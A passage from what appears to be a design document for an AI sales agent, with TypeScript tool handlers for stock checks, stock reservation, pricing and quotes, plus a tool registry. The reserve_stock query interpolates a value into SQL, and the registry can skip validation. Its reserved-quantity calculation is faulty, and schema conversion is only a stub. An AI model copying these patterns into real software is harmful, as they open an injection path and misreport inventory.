        const incoming = parseInt(stock.incoming_quantity) || 0;
        const canFulfill = available >= item.quantity;
        const shortfall = canFulfill ? undefined : item.quantity - available;
        
        const result: any = {
          productId: product.id,
          sku: product.sku,
          productName: product.name,
          requestedQuantity: item.quantity,
          availableQuantity: available,
          reservedQuantity: reserved,
          isAvailable: available > 0,
          canFulfill,
          shortfall
        };
        
        // Add incoming stock info if relevant
        if (!canFulfill && incoming > 0) {
          result.incomingStock = {
            quantity: incoming,
            expectedDate: stock.incoming_date?.toISOString()
          };
        }
        
        // Find alternatives if out of stock
        if (!canFulfill) {
          const alternativesResult = await db.query(`
            SELECT 
              p.id, p.sku, p.name,
              ps.available_quantity
            FROM products p
            JOIN product_stock ps ON ps.product_id = p.id
            WHERE p.tenant_id = $1
              AND p.id != $2
              AND p.category_id = $3
              AND p.is_active = true
              AND ps.available_quantity >= $4
            ORDER BY ps.available_quantity DESC
            LIMIT 3
          `, [tenantId, product.id, product.category_id, item.quantity]);
          
          if (alternativesResult.rows.length > 0) {
            result.alternatives = alternativesResult.rows.map(alt => ({
              productId: alt.id,
              sku: alt.sku,
              name: alt.name,
              availableQuantity: parseInt(alt.available_quantity)
            }));
          }
        }
        
        results.push(result);
      }
      
      const availableCount = results.filter(r => r.canFulfill).length;
      
      return {
        success: true,
        data: {
          results,
          summary: {
            totalProducts: results.length,
            allAvailable: availableCount === results.length,
            availableCount,
            unavailableCount: results.length - availableCount
          }
        }
      };
      
    } catch (error) {
      logger.error('check_stock error', { error });
      return {
        success: false,
        error: {
          code: 'STOCK_CHECK_ERROR',
          message: error instanceof Error ? error.message : 'Stock check failed'
        }
      };
    }
  },
  
  config: {
    timeout: 15000,
    maxRetries: 2,
    rateLimit: { max: 50, windowMs: 60000 },
    requiredPermissions: ['inventory:read'],
    tenantScoped: true,
    cacheable: false, // Real-time stock
    requiresConfirmation: false,
    isMutating: false
  },
  
  metadata: {
    author: 'Cerniq Team',
    createdAt: new Date('2026-01-01'),
    updatedAt: new Date('2026-01-18'),
    enabled: true,
    deprecated: false,
    callCount: 0,
    successRate: 0,
    avgLatency: 0,
    examples: [
      {
        name: 'Check multiple products',
        description: 'Check stock for order',
        input: {
          products: [
            { sku: 'FERT-001', quantity: 50 },
            { sku: 'PEST-002', quantity: 10 }
          ]
        },
        output: {
          results: [/* ... */],
          summary: { totalProducts: 2, allAvailable: true, availableCount: 2, unavailableCount: 0 }
        }
      }
    ],
    relatedTools: ['search_products', 'reserve_stock', 'get_product_details']
  }
};

/**
 * Tool: reserve_stock
 * Reserve stock for a pending order
 */
export const reserveStockTool: MCPTool = {
  name: 'reserve_stock',
  displayName: 'Reserve Stock',
  displayNameRo: 'Rezervare Stoc',
  description: 'Reserve stock for a potential order (requires confirmation)',
  descriptionRo: 'Rezervă stoc pentru o comandă potențială (necesită confirmare)',
  version: '1.0.0',
  category: 'inventory',
  tags: ['stock', 'reservation', 'order'],
  
  inputSchema: z.object({
    conversationId: z.string().describe('Conversation ID for tracking'),
    customerId: z.string().describe('Customer ID'),
    items: z.array(z.object({
      productId: z.string().optional(),
      sku: z.string().optional(),
      quantity: z.number().min(1)
    })).min(1).max(20),
    expirationMinutes: z.number().min(5).max(1440).default(60).describe('Reservation expiration in minutes')
  }),
  
  outputSchema: z.object({
    reservationId: z.string(),
    status: z.enum(['confirmed', 'partial', 'failed']),
    items: z.array(z.object({
      productId: z.string(),
      sku: z.string(),
      requestedQuantity: z.number(),
      reservedQuantity: z.number(),
      status: z.enum(['reserved', 'partial', 'failed']),
      reason: z.string().optional()
    })),
    expiresAt: z.string(),
    totalReserved: z.number()
  }),
  
  handler: async (input, context) => {
    const { tenantId, db, logger } = context;
    const { conversationId, customerId, items, expirationMinutes } = input;
    
    const client = await db.connect();
    
    try {
      await client.query('BEGIN');
      
      // Create reservation record
      const reservationResult = await client.query(`
        INSERT INTO stock_reservations (
          tenant_id, conversation_id, customer_id, 
          status, expires_at, created_at
        ) VALUES ($1, $2, $3, 'pending', NOW() + INTERVAL '${expirationMinutes} minutes', NOW())
        RETURNING id, expires_at
      `, [tenantId, conversationId, customerId]);
      
      const reservationId = reservationResult.rows[0].id;
      const expiresAt = reservationResult.rows[0].expires_at;
      
      const itemResults: any[] = [];
      let totalReserved = 0;
      let allReserved = true;
      let anyReserved = false;
      
      for (const item of items) {
        // Find product
        let product;
        if (item.productId) {
          const result = await client.query(
            'SELECT id, sku, name FROM products WHERE id = $1 AND tenant_id = $2',
            [item.productId, tenantId]
          );
          product = result.rows[0];
        } else if (item.sku) {
          const result = await client.query(
            'SELECT id, sku, name FROM products WHERE sku = $1 AND tenant_id = $2',
            [item.sku, tenantId]
          );
          product = result.rows[0];
        }
        
        if (!product) {
          itemResults.push({
            productId: item.productId || '',
            sku: item.sku || '',
            requestedQuantity: item.quantity,
            reservedQuantity: 0,
            status: 'failed',
            reason: 'Product not found'
          });
          allReserved = false;
          continue;
        }
        
        // Try to reserve with row locking
        const stockResult = await client.query(`
          UPDATE product_stock
          SET 
            available_quantity = available_quantity - LEAST(available_quantity, $3),
            reserved_quantity = reserved_quantity + LEAST(available_quantity, $3)
          WHERE product_id = $1 AND tenant_id = $2 AND available_quantity > 0
          RETURNING 
            LEAST(available_quantity + LEAST(available_quantity, $3), $3) as reserved_qty,
            available_quantity as remaining
        `, [product.id, tenantId, item.quantity]);
        
        let reservedQty = 0;
        if (stockResult.rows.length > 0) {
          reservedQty = parseInt(stockResult.rows[0].reserved_qty) || 0;
        }
        
        // Create reservation item
        await client.query(`
          INSERT INTO stock_reservation_items (
            reservation_id, product_id, requested_quantity, reserved_quantity
          ) VALUES ($1, $2, $3, $4)
        `, [reservationId, product.id, item.quantity, reservedQty]);
        
        const status = reservedQty === item.quantity ? 'reserved' 
          : reservedQty > 0 ? 'partial' : 'failed';
        
        itemResults.push({
          productId: product.id,
          sku: product.sku,
          requestedQuantity: item.quantity,
          reservedQuantity: reservedQty,
          status,
          reason: status === 'failed' ? 'Insufficient stock' 
            : status === 'partial' ? `Only ${reservedQty} units available` : undefined
        });
        
        totalReserved += reservedQty;
        if (status !== 'reserved') allReserved = false;
        if (reservedQty > 0) anyReserved = true;
      }
      
      // Update reservation status
      const finalStatus = allReserved ? 'confirmed' : anyReserved ? 'partial' : 'failed';
      await client.query(
        'UPDATE stock_reservations SET status = $1 WHERE id = $2',
        [finalStatus, reservationId]
      );
      
      await client.query('COMMIT');
      
      return {
        success: true,
        data: {
          reservationId,
          status: finalStatus,
          items: itemResults,
          expiresAt: expiresAt.toISOString(),
          totalReserved
        }
      };
      
    } catch (error) {
      await client.query('ROLLBACK');
      logger.error('reserve_stock error', { error });
      return {
        success: false,
        error: {
          code: 'RESERVATION_ERROR',
          message: error instanceof Error ? error.message : 'Reservation failed'
        }
      };
    } finally {
      client.release();
    }
  },
  
  config: {
    timeout: 30000,
    maxRetries: 1,
    requiredPermissions: ['inventory:write', 'orders:create'],
    tenantScoped: true,
    cacheable: false,
    requiresConfirmation: true, // Requires HITL approval
    isMutating: true
  },
  
  metadata: {
    author: 'Cerniq Team',
    createdAt: new Date('2026-01-01'),
    updatedAt: new Date('2026-01-18'),
    enabled: true,
    deprecated: false,
    callCount: 0,
    successRate: 0,
    avgLatency: 0,
    examples: [],
    relatedTools: ['check_stock', 'release_reservation', 'create_order']
  }
};
```

### 3.5 Built-in Pricing Tools

```typescript
// src/workers/mcp/tools/pricing-tools.ts

import { z } from 'zod';
import { MCPTool, ToolResult } from './types';

/**
 * Tool: get_product_price
 * Get current price for a product including discounts
 */
export const getProductPriceTool: MCPTool = {
  name: 'get_product_price',
  displayName: 'Get Product Price',
  displayNameRo: 'Obține Prețul Produsului',
  description: 'Get the current price for a product including applicable discounts',
  descriptionRo: 'Obține prețul curent pentru un produs inclusiv reducerile aplicabile',
  version: '1.0.0',
  category: 'pricing',
  tags: ['price', 'discount', 'product'],
  
  inputSchema: z.object({
    productId: z.string().optional(),
    sku: z.string().optional(),
    customerId: z.string().optional().describe('Customer ID for personalized pricing'),
    quantity: z.number().min(1).default(1).describe('Quantity for volume discounts'),
    includeVat: z.boolean().default(true).describe('Include VAT in price')
  }).refine(data => data.productId || data.sku, {
    message: 'Either productId or sku must be provided'
  }),
  
  outputSchema: z.object({
    productId: z.string(),
    sku: z.string(),
    productName: z.string(),
    pricing: z.object({
      basePrice: z.number(),
      finalPrice: z.number(),
      unitPrice: z.number(),
      totalPrice: z.number(),
      currency: z.string(),
      vatRate: z.number(),
      vatAmount: z.number(),
      quantity: z.number(),
      discounts: z.array(z.object({
        type: z.enum(['percentage', 'fixed', 'volume', 'customer', 'promotion']),
        name: z.string(),
        value: z.number(),
        amount: z.number()
      })),
      totalDiscount: z.number(),
      discountPercentage: z.number()
    }),
    validUntil: z.string().optional()
  }),
  
  handler: async (input, context) => {
    const { tenantId, db, logger } = context;
    const { productId, sku, customerId, quantity, includeVat } = input;
    
    try {
      // Find product
      let whereClause: string;
      let params: any[];
      
      if (productId) {
        whereClause = 'id = $1 AND tenant_id = $2';
        params = [productId, tenantId];
      } else {
        whereClause = 'sku = $1 AND tenant_id = $2';
        params = [sku, tenantId];
      }
      
      const productResult = await db.query(`
        SELECT id, sku, name, base_price, currency, vat_rate
        FROM products
        WHERE ${whereClause} AND is_active = true
      `, params);
      
      if (productResult.rows.length === 0) {
        return {
          success: false,
          error: {
            code: 'PRODUCT_NOT_FOUND',
            message: `Product not found: ${productId || sku}`
          }
        };
      }
      
      const product = productResult.rows[0];
      const basePrice = parseFloat(product.base_price);
      const vatRate = parseFloat(product.vat_rate) || 0.19;
      
      const discounts: any[] = [];
      let totalDiscountAmount = 0;
      
      // Get product-level discounts
      const productDiscounts = await db.query(`
        SELECT type, name, discount_value, discount_type
        FROM product_discounts
        WHERE product_id = $1 
          AND is_active = true
          AND (valid_from IS NULL OR valid_from <= NOW())
          AND (valid_until IS NULL OR valid_until >= NOW())
      `, [product.id]);
      
      for (const disc of productDiscounts.rows) {
        const amount = disc.discount_type === 'percentage' 
          ? basePrice * (parseFloat(disc.discount_value) / 100)
          : parseFloat(disc.discount_value);
        
        discounts.push({
          type: 'promotion',
          name: disc.name,
          value: parseFloat(disc.discount_value),
          amount
        });
        totalDiscountAmount += amount;
      }
      
      // Get volume discounts
      if (quantity > 1) {
        const volumeDiscount = await db.query(`
          SELECT discount_percentage
          FROM volume_discounts
          WHERE product_id = $1 AND min_quantity <= $2
          ORDER BY min_quantity DESC
          LIMIT 1
        `, [product.id, quantity]);
        
        if (volumeDiscount.rows.length > 0) {
          const discPct = parseFloat(volumeDiscount.rows[0].discount_percentage);
          const amount = basePrice * (discPct / 100);
          
          discounts.push({
            type: 'volume',
            name: `Discount volum (${quantity} unități)`,
            value: discPct,
            amount
          });
          totalDiscountAmount += amount;
        }
      }
      
      // Get customer-specific pricing
      if (customerId) {
        const customerDiscount = await db.query(`
          SELECT discount_percentage, price_list_id
          FROM customer_pricing
          WHERE customer_id = $1 AND product_id = $2
          UNION
          SELECT cp.discount_percentage, cp.price_list_id
          FROM customer_price_lists cpl
          JOIN customer_pricing cp ON cp.price_list_id = cpl.price_list_id
          WHERE cpl.customer_id = $1 AND cp.product_id = $2
          LIMIT 1
        `, [customerId, product.id]);
        
        if (customerDiscount.rows.length > 0) {
          const discPct = parseFloat(customerDiscount.rows[0].discount_percentage);
          const amount = basePrice * (discPct / 100);
          
          discounts.push({
            type: 'customer',
            name: 'Discount client',
            value: discPct,
            amount
          });
          totalDiscountAmount += amount;
        }
      }
      
      // Calculate final prices
      const discountedPrice = Math.max(0, basePrice - totalDiscountAmount);
      const unitPrice = includeVat ? discountedPrice * (1 + vatRate) : discountedPrice;
      const totalPrice = unitPrice * quantity;
      const vatAmount = includeVat ? discountedPrice * vatRate * quantity : 0;
      const discountPercentage = basePrice > 0 ? (totalDiscountAmount / basePrice) * 100 : 0;
      
      return {
        success: true,
        data: {
          productId: product.id,
          sku: product.sku,
          productName: product.name,
          pricing: {
            basePrice,
            finalPrice: discountedPrice,
            unitPrice,
            totalPrice,
            currency: product.currency || 'RON',
            vatRate: vatRate * 100,
            vatAmount,
            quantity,
            discounts,
            totalDiscount: totalDiscountAmount,
            discountPercentage: Math.round(discountPercentage * 100) / 100
          },
          validUntil: new Date(Date.now() + 3600000).toISOString() // 1 hour validity
        }
      };
      
    } catch (error) {
      logger.error('get_product_price error', { error });
      return {
        success: false,
        error: {
          code: 'PRICING_ERROR',
          message: error instanceof Error ? error.message : 'Pricing calculation failed'
        }
      };
    }
  },
  
  config: {
    timeout: 10000,
    maxRetries: 2,
    requiredPermissions: ['pricing:read'],
    tenantScoped: true,
    cacheable: true,
    cacheTtl: 300,
    cacheKeyFn: (input) => `${input.productId || input.sku}-${input.customerId || 'default'}-${input.quantity}`,
    requiresConfirmation: false,
    isMutating: false
  },
  
  metadata: {
    author: 'Cerniq Team',
    createdAt: new Date('2026-01-01'),
    updatedAt: new Date('2026-01-18'),
    enabled: true,
    deprecated: false,
    callCount: 0,
    successRate: 0,
    avgLatency: 0,
    examples: [
      {
        name: 'Simple price check',
        description: 'Get price with VAT',
        input: { sku: 'FERT-001', quantity: 1, includeVat: true },
        output: { /* ... */ }
      },
      {
        name: 'Volume pricing',
        description: 'Get price for bulk order',
        input: { sku: 'FERT-001', quantity: 100, customerId: 'cust-123' },
        output: { /* ... */ }
      }
    ],
    relatedTools: ['search_products', 'calculate_quote', 'apply_discount']
  }
};

/**
 * Tool: calculate_quote
 * Calculate a full quote for multiple products
 */
export const calculateQuoteTool: MCPTool = {
  name: 'calculate_quote',
  displayName: 'Calculate Quote',
  displayNameRo: 'Calculare Ofertă',
  description: 'Calculate a complete quote with multiple products and discounts',
  descriptionRo: 'Calculează o ofertă completă cu mai multe produse și reduceri',
  version: '1.0.0',
  category: 'pricing',
  tags: ['quote', 'pricing', 'order'],
  
  inputSchema: z.object({
    customerId: z.string().describe('Customer ID'),
    items: z.array(z.object({
      productId: z.string().optional(),
      sku: z.string().optional(),
      quantity: z.number().min(1)
    })).min(1).max(50),
    includeVat: z.boolean().default(true),
    applyCustomerDiscount: z.boolean().default(true),
    additionalDiscount: z.object({
      type: z.enum(['percentage', 'fixed']).optional(),
      value: z.number().optional()
    }).optional()
  }),
  
  outputSchema: z.object({
    quoteId: z.string().optional(),
    customerId: z.string(),
    customerName: z.string(),
    items: z.array(z.object({
      productId: z.string(),
      sku: z.string(),
      name: z.string(),
      quantity: z.number(),
      unitPrice: z.number(),
      lineTotal: z.number(),
      discounts: z.array(z.any())
    })),
    subtotal: z.number(),
    totalDiscount: z.number(),
    vatAmount: z.number(),
    total: z.number(),
    currency: z.string(),
    validUntil: z.string()
  }),
  
  handler: async (input, context) => {
    const { tenantId, db, logger } = context;
    const { customerId, items, includeVat, applyCustomerDiscount, additionalDiscount } = input;
    
    try {
      // Get customer info
      const customerResult = await db.query(`
        SELECT id, company_name FROM contacts_gold
        WHERE id = $1 AND tenant_id = $2
      `, [customerId, tenantId]);
      
      if (customerResult.rows.length === 0) {
        return {
          success: false,
          error: {
            code: 'CUSTOMER_NOT_FOUND',
            message: `Customer not found: ${customerId}`
          }
        };
      }
      
      const customer = customerResult.rows[0];
      
      const quoteItems: any[] = [];
      let subtotal = 0;
      let totalVat = 0;
      let totalDiscount = 0;
      
      // Process each item
      for (const item of items) {
        // Get product
        let product;
        if (item.productId) {
          const result = await db.query(
            'SELECT * FROM products WHERE id = $1 AND tenant_id = $2 AND is_active = true',
            [item.productId, tenantId]
          );
          product = result.rows[0];
        } else if (item.sku) {
          const result = await db.query(
            'SELECT * FROM products WHERE sku = $1 AND tenant_id = $2 AND is_active = true',
            [item.sku, tenantId]
          );
          product = result.rows[0];
        }
        
        if (!product) {
          continue;
        }
        
        const basePrice = parseFloat(product.base_price);
        const vatRate = parseFloat(product.vat_rate) || 0.19;
        
        const itemDiscounts: any[] = [];
        let itemDiscountAmount = 0;
        
        // Volume discount
        if (item.quantity > 1) {
          const volumeDisc = await db.query(`
            SELECT discount_percentage FROM volume_discounts
            WHERE product_id = $1 AND min_quantity <= $2
            ORDER BY min_quantity DESC LIMIT 1
          `, [product.id, item.quantity]);
          
          if (volumeDisc.rows.length > 0) {
            const pct = parseFloat(volumeDisc.rows[0].discount_percentage);
            const amount = basePrice * (pct / 100);
            itemDiscounts.push({ type: 'volume', value: pct, amount });
            itemDiscountAmount += amount;
          }
        }
        
        // Customer discount
        if (applyCustomerDiscount) {
          const custDisc = await db.query(`
            SELECT discount_percentage FROM customer_pricing
            WHERE customer_id = $1 AND (product_id = $2 OR product_id IS NULL)
            LIMIT 1
          `, [customerId, product.id]);
          
          if (custDisc.rows.length > 0) {
            const pct = parseFloat(custDisc.rows[0].discount_percentage);
            const amount = basePrice * (pct / 100);
            itemDiscounts.push({ type: 'customer', value: pct, amount });
            itemDiscountAmount += amount;
          }
        }
        
        const discountedPrice = Math.max(0, basePrice - itemDiscountAmount);
        const linePrice = includeVat ? discountedPrice * (1 + vatRate) : discountedPrice;
        const lineTotal = linePrice * item.quantity;
        const lineVat = includeVat ? discountedPrice * vatRate * item.quantity : 0;
        
        quoteItems.push({
          productId: product.id,
          sku: product.sku,
          name: product.name,
          quantity: item.quantity,
          unitPrice: linePrice,
          lineTotal,
          discounts: itemDiscounts
        });
        
        subtotal += lineTotal;
        totalVat += lineVat;
        totalDiscount += itemDiscountAmount * item.quantity;
      }
      
      // Apply additional discount to total
      if (additionalDiscount?.value && additionalDiscount.value > 0) {
        const addDiscount = additionalDiscount.type === 'percentage'
          ? subtotal * (additionalDiscount.value / 100)
          : additionalDiscount.value;
        
        subtotal -= addDiscount;
        totalDiscount += addDiscount;
      }
      
      return {
        success: true,
        data: {
          customerId: customer.id,
          customerName: customer.company_name,
          items: quoteItems,
          subtotal: Math.round(subtotal * 100) / 100,
          totalDiscount: Math.round(totalDiscount * 100) / 100,
          vatAmount: Math.round(totalVat * 100) / 100,
          total: Math.round(subtotal * 100) / 100,
          currency: 'RON',
          validUntil: new Date(Date.now() + 7 * 24 * 3600000).toISOString() // 7 days
        }
      };
      
    } catch (error) {
      logger.error('calculate_quote error', { error });
      return {
        success: false,
        error: {
          code: 'QUOTE_ERROR',
          message: error instanceof Error ? error.message : 'Quote calculation failed'
        }
      };
    }
  },
  
  config: {
    timeout: 30000,
    maxRetries: 2,
    requiredPermissions: ['pricing:read', 'quotes:create'],
    tenantScoped: true,
    cacheable: false,
    requiresConfirmation: false,
    isMutating: false
  },
  
  metadata: {
    author: 'Cerniq Team',
    createdAt: new Date('2026-01-01'),
    updatedAt: new Date('2026-01-18'),
    enabled: true,
    deprecated: false,
    callCount: 0,
    successRate: 0,
    avgLatency: 0,
    examples: [],
    relatedTools: ['get_product_price', 'create_quote', 'send_quote']
  }
};
```

### 3.6 Tool Registry Service

```typescript
// src/workers/mcp/tools/tool-registry.ts

import { MCPTool, ToolCategory, ToolConfig, ToolMetadata, ToolResult, ToolExecutionContext } from './types';
import { redisClient } from '@cerniq/redis';
import { pool } from '@cerniq/database';
import { logger } from '@cerniq/logger';
import { metrics } from '@cerniq/metrics';
import { EventEmitter } from 'events';

// Built-in tools
import { searchProductsTool, getProductDetailsTool } from './product-tools';
import { checkStockTool, reserveStockTool } from './inventory-tools';
import { getProductPriceTool, calculateQuoteTool } from './pricing-tools';

interface ToolRegistration {
  tool: MCPTool;
  registeredAt: Date;
  registeredBy: string;
  tenantId?: string; // null = global tool
}

interface ToolExecutionOptions {
  timeout?: number;
  skipCache?: boolean;
  skipValidation?: boolean;
}

export class ToolRegistry extends EventEmitter {
  private tools: Map<string, ToolRegistration> = new Map();
  private tenantTools: Map<string, Map<string, ToolRegistration>> = new Map();
  private executionCache: Map<string, { result: ToolResult; expiresAt: number }> = new Map();
  
  constructor() {
    super();
    this.registerBuiltInTools();
    this.startCacheCleanup();
  }
  
  /**
   * Register built-in tools
   */
  private registerBuiltInTools(): void {
    const builtInTools: MCPTool[] = [
      // Product tools
      searchProductsTool,
      getProductDetailsTool,
      
      // Inventory tools
      checkStockTool,
      reserveStockTool,
      
      // Pricing tools
      getProductPriceTool,
      calculateQuoteTool
    ];
    
    for (const tool of builtInTools) {
      this.registerTool(tool, 'system', undefined);
    }
    
    logger.info('Built-in tools registered', { count: builtInTools.length });
  }
  
  /**
   * Register a tool
   */
  registerTool(
    tool: MCPTool,
    registeredBy: string,
    tenantId?: string
  ): boolean {
    try {
      // Validate tool schema
      this.validateTool(tool);
      
      const registration: ToolRegistration = {
        tool,
        registeredAt: new Date(),
        registeredBy,
        tenantId
      };
      
      if (tenantId) {
        // Tenant-specific tool
        if (!this.tenantTools.has(tenantId)) {
          this.tenantTools.set(tenantId, new Map());
        }
        this.tenantTools.get(tenantId)!.set(tool.name, registration);
      } else {
        // Global tool
        this.tools.set(tool.name, registration);
      }
      
      this.emit('tool:registered', { name: tool.name, tenantId });
      
      logger.info('Tool registered', {
        name: tool.name,
        category: tool.category,
        tenantId: tenantId || 'global',
        registeredBy
      });
      
      return true;
      
    } catch (error) {
      logger.error('Tool registration failed', {
        name: tool.name,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      return false;
    }
  }
  
  /**
   * Unregister a tool
   */
  unregisterTool(name: string, tenantId?: string): boolean {
    if (tenantId) {
      const tenantMap = this.tenantTools.get(tenantId);
      if (tenantMap?.has(name)) {
        tenantMap.delete(name);
        this.emit('tool:unregistered', { name, tenantId });
        return true;
      }
    } else {
      if (this.tools.has(name)) {
        this.tools.delete(name);
        this.emit('tool:unregistered', { name, tenantId: 'global' });
        return true;
      }
    }
    return false;
  }
  
  /**
   * Get a tool by name
   */
  getTool(name: string, tenantId?: string): MCPTool | null {
    // First check tenant-specific tools
    if (tenantId) {
      const tenantMap = this.tenantTools.get(tenantId);
      if (tenantMap?.has(name)) {
        return tenantMap.get(name)!.tool;
      }
    }
    
    // Fall back to global tools
    return this.tools.get(name)?.tool || null;
  }
  
  /**
   * List all available tools
   */
  listTools(options: {
    tenantId?: string;
    category?: ToolCategory;
    enabled?: boolean;
    includeGlobal?: boolean;
  } = {}): MCPTool[] {
    const { tenantId, category, enabled = true, includeGlobal = true } = options;
    
    const tools: MCPTool[] = [];
    
    // Add global tools
    if (includeGlobal) {
      for (const reg of this.tools.values()) {
        if (this.matchesFilter(reg.tool, category, enabled)) {
          tools.push(reg.tool);
        }
      }
    }
    
    // Add tenant tools
    if (tenantId) {
      const tenantMap = this.tenantTools.get(tenantId);
      if (tenantMap) {
        for (const reg of tenantMap.values()) {
          if (this.matchesFilter(reg.tool, category, enabled)) {
            tools.push(reg.tool);
          }
        }
      }
    }
    
    return tools;
  }
  
  /**
   * Execute a tool
   */
  async executeTool(
    name: string,
    input: any,
    context: ToolExecutionContext,
    options: ToolExecutionOptions = {}
  ): Promise<ToolResult> {
    const startTime = Date.now();
    const timer = metrics.histogram('mcp_tool_execution_duration_seconds').startTimer();
    
    try {
      // Get tool
      const tool = this.getTool(name, context.tenantId);
      if (!tool) {
        return {
          success: false,
          error: {
            code: 'TOOL_NOT_FOUND',
            message: `Tool not found: ${name}`
          }
        };
      }
      
      // Check if tool is enabled
      if (!tool.metadata.enabled) {
        return {
          success: false,
          error: {
            code: 'TOOL_DISABLED',
            message: `Tool is disabled: ${name}`
          }
        };
      }
      
      // Check permissions
      if (!this.checkPermissions(tool, context.permissions)) {
        return {
          success: false,
          error: {
            code: 'PERMISSION_DENIED',
            message: `Insufficient permissions for tool: ${name}`
          }
        };
      }
      
      // Validate input
      if (!options.skipValidation) {
        const validationResult = tool.inputSchema.safeParse(input);
        if (!validationResult.success) {
          return {
            success: false,
            error: {
              code: 'VALIDATION_ERROR',
              message: 'Invalid input',
              details: validationResult.error.errors
            }
          };
        }
        input = validationResult.data;
      }
      
      // Check cache
      if (tool.config.cacheable && !options.skipCache) {
        const cacheKey = this.getCacheKey(name, input, context.tenantId);
        const cached = this.executionCache.get(cacheKey);
        
        if (cached && cached.expiresAt > Date.now()) {
          timer({ tool: name, status: 'cached' });
          return {
            ...cached.result,
            metadata: {
              ...cached.result.metadata,
              cached: true
            }
          };
        }
      }
      
      // Apply rate limiting
      if (tool.config.rateLimit) {
        const allowed = await this.checkRateLimit(name, context.tenantId, tool.config.rateLimit);
        if (!allowed) {
          return {
            success: false,
            error: {
              code: 'RATE_LIMITED',
              message: 'Tool rate limit exceeded'
            }
          };
        }
      }
      
      // Execute with timeout
      const timeout = options.timeout || tool.config.timeout;
      const result = await this.executeWithTimeout(
        tool.handler(input, context),
        timeout
      );
      
      // Cache result if successful
      if (result.success && tool.config.cacheable) {
        const cacheKey = this.getCacheKey(name, input, context.tenantId);
        const ttl = tool.config.cacheTtl || 60;
        this.executionCache.set(cacheKey, {
          result,
          expiresAt: Date.now() + (ttl * 1000)
        });
      }
      
      // Update metrics
      const duration = Date.now() - startTime;
      timer({ tool: name, status: result.success ? 'success' : 'error' });
      metrics.counter('mcp_tool_executions_total').inc({ 
        tool: name, 
        status: result.success ? 'success' : 'error' 
      });
      
      // Update tool stats
      this.updateToolStats(name, result.success, duration);
      
      // Emit event
      this.emit('tool:executed', {
        name,
        success: result.success,
        duration,
        tenantId: context.tenantId
      });
      
      return {
        ...result,
        metadata: {
          ...result.metadata,
          executionTime: duration,
          cached: false
        }
      };
      
    } catch (error) {
      timer({ tool: name, status: 'error' });
      metrics.counter('mcp_tool_errors_total').inc({ tool: name });
      
      logger.error('Tool execution error', {
        tool: name,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      
      return {
        success: false,
        error: {
          code: 'EXECUTION_ERROR',
          message: error instanceof Error ? error.message : 'Tool execution failed'
        }
      };
    }
  }
  
  /**
   * Validate tool definition
   */
  private validateTool(tool: MCPTool): void {
    if (!tool.name || typeof tool.name !== 'string') {
      throw new Error('Tool must have a valid name');
    }
    
    if (!tool.handler || typeof tool.handler !== 'function') {
      throw new Error('Tool must have a valid handler function');
    }
    
    if (!tool.inputSchema) {
      throw new Error('Tool must have an input schema');
    }
    
    if (!tool.config) {
      throw new Error('Tool must have a config');
    }
    
    // Validate name format
    if (!/^[a-z][a-z0-9_]*$/.test(tool.name)) {
      throw new Error('Tool name must be lowercase alphanumeric with underscores');
    }
  }
  
  /**
   * Check if tool matches filters
   */
  private matchesFilter(
    tool: MCPTool,
    category?: ToolCategory,
    enabled?: boolean
  ): boolean {
    if (category && tool.category !== category) {
      return false;
    }
    if (enabled !== undefined && tool.metadata.enabled !== enabled) {
      return false;
    }
    return true;
  }
  
  /**
   * Check permissions
   */
  private checkPermissions(tool: MCPTool, userPermissions: string[]): boolean {
    if (!tool.config.requiredPermissions || tool.config.requiredPermissions.length === 0) {
      return true;
    }
    
    return tool.config.requiredPermissions.every(
      perm => userPermissions.includes(perm) || userPermissions.includes('*')
    );
  }
  
  /**
   * Get cache key for tool execution
   */
  private getCacheKey(name: string, input: any, tenantId: string): string {
    const tool = this.getTool(name, tenantId);
    if (tool?.config.cacheKeyFn) {
      return `tool:${tenantId}:${name}:${tool.config.cacheKeyFn(input)}`;
    }
    return `tool:${tenantId}:${name}:${JSON.stringify(input)}`;
  }
  
  /**
   * Check rate limit
   */
  private async checkRateLimit(
    name: string,
    tenantId: string,
    limit: { max: number; windowMs: number }
  ): Promise<boolean> {
    const key = `rate:tool:${tenantId}:${name}`;
    const now = Date.now();
    const windowStart = now - limit.windowMs;
    
    // Remove old entries
    await redisClient.zRemRangeByScore(key, 0, windowStart);
    
    // Count current window
    const count = await redisClient.zCard(key);
    
    if (count >= limit.max) {
      return false;
    }
    
    // Add current request
    await redisClient.zAdd(key, { score: now, value: now.toString() });
    await redisClient.expire(key, Math.ceil(limit.windowMs / 1000));
    
    return true;
  }
  
  /**
   * Execute with timeout
   */
  private async executeWithTimeout<T>(
    promise: Promise<T>,
    timeoutMs: number
  ): Promise<T> {
    const timeoutPromise = new Promise<never>((_, reject) => {
      setTimeout(() => reject(new Error('Tool execution timed out')), timeoutMs);
    });
    
    return Promise.race([promise, timeoutPromise]);
  }
  
  /**
   * Update tool usage statistics
   */
  private updateToolStats(name: string, success: boolean, duration: number): void {
    const registration = this.tools.get(name);
    if (registration) {
      const meta = registration.tool.metadata;
      meta.callCount++;
      
      // Update success rate (exponential moving average)
      const alpha = 0.1;
      meta.successRate = meta.successRate * (1 - alpha) + (success ? 1 : 0) * alpha;
      
      // Update average latency
      meta.avgLatency = meta.avgLatency * (1 - alpha) + duration * alpha;
    }
  }
  
  /**
   * Start cache cleanup interval
   */
  private startCacheCleanup(): void {
    setInterval(() => {
      const now = Date.now();
      for (const [key, entry] of this.executionCache) {
        if (entry.expiresAt <= now) {
          this.executionCache.delete(key);
        }
      }
    }, 60000); // Every minute
  }
  
  /**
   * Get tool schema for LLM
   */
  getToolSchema(name: string, tenantId?: string): any | null {
    const tool = this.getTool(name, tenantId);
    if (!tool) return null;
    
    return {
      name: tool.name,
      description: tool.description,
      input_schema: this.zodToJsonSchema(tool.inputSchema)
    };
  }
  
  /**
   * Get all tool schemas for LLM
   */
  getAllToolSchemas(tenantId?: string): any[] {
    const tools = this.listTools({ tenantId, enabled: true });
    return tools.map(tool => this.getToolSchema(tool.name, tenantId)).filter(Boolean);
  }
  
  /**
   * Convert Zod schema to JSON Schema (simplified)
   */
  private zodToJsonSchema(schema: any): any {
    // Note: In production, use zod-to-json-schema library
    return {
      type: 'object',
      properties: {},
      required: []
    };
  }
}

// Singleton instance
export const toolRegistry = new ToolRegistry();
```

### 3.7 Tool Registry Worker Implementation

```typescript
// src/workers/mcp/l2-tool-registry.worker.ts

import { Worker, Job, Queue } from 'bullmq';
import { redisConnection } from '@cerniq/redis';
import { logger } from '@cerniq/logger';
import { metrics } from '@cerniq/metrics';
